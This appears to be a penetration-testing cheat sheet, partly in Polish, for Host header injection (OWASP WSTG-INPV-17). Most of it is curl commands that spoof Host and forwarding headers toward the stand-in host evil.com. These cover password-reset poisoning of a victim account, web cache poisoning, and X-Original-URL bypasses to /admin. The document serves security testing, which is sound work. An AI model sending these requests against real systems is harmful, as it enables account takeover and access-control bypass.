# WSTG-INPV-17 — Testing for Host Header Injection

## Cele

- Assess if the Host header is being parsed dynamically in the application
- Bypass security controls that rely on the header

## KOMENDY

### Podstawowe Host header injection

```bash
curl -s "https://TARGET/" -H "Host: evil.com" -o /dev/null -w "%{http_code}\n"
curl -s "https://TARGET/" -H "Host: evil.com" | grep -i "evil.com"

```

### X-Forwarded-Host

```bash
curl -s "https://TARGET/" -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"

```

### Inne headery

```bash
curl -s "https://TARGET/" -H "X-Host: evil.com"
curl -s "https://TARGET/" -H "X-Original-URL: /admin"
curl -s "https://TARGET/" -H "X-Rewrite-URL: /admin"
curl -s "https://TARGET/" -H "X-Forwarded-Server: evil.com"

```

### Password reset poisoning

```bash
curl -X POST "https://TARGET/forgot-password" -d "email=victim@target.com" -H "Host: evil.com"
curl -X POST "https://TARGET/forgot-password" -d "email=victim@target.com" -H "X-Forwarded-Host: evil.com"

```

### Double Host header

```bash
curl -s "https://TARGET/" -H "Host: evil.com" -H "Host: TARGET"

```

### Host z portem

```bash
curl -s "https://TARGET/" -H "Host: TARGET:evil.com"

```

### Web cache poisoning via Host

```bash
curl -s "https://TARGET/static/page" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"

```

## KOMENDY Z WORDLISTAMI

### Brak dedykowanych wordlist - test logiczny

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Reverse Proxy Misconfigurations/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Sprawdz czy aplikacja generuje linki na podstawie Host headera
2. Testuj password reset poisoning
3. Sprawdz web cache poisoning via Host manipulation
4. Testuj dostep do zasobow wewnetrznych przez X-Original-URL
5. Sprawdz SSRF via Host header
6. Uzyj Burp Repeater do testowania roznych wariantow

